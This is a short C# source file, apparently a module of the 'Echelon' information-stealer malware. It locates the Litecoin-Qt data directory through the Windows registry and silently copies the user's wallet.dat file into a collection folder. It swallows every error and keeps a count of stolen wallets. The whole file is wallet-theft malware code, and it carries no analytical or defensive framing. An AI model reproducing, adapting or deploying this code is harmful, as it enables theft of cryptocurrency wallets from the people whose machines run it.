


using System.IO;
using Microsoft.Win32;

namespace Echelon
{
    internal class LitecoinCore
    {
        public static int count;

        public static void LitecStr(string directorypath) 
        {
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
                {
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\LitecoinCore\\");
                        File.Copy(registryKey.GetValue("strDataDir") + "\\wallet.dat", directorypath + "\\LitecoinCore\\wallet.dat");
                        count++;
                        Wallets.count++;
                    }
                    catch 
                    {
                    }
                }
            }
            catch 
            {
            }
        }
    }
}
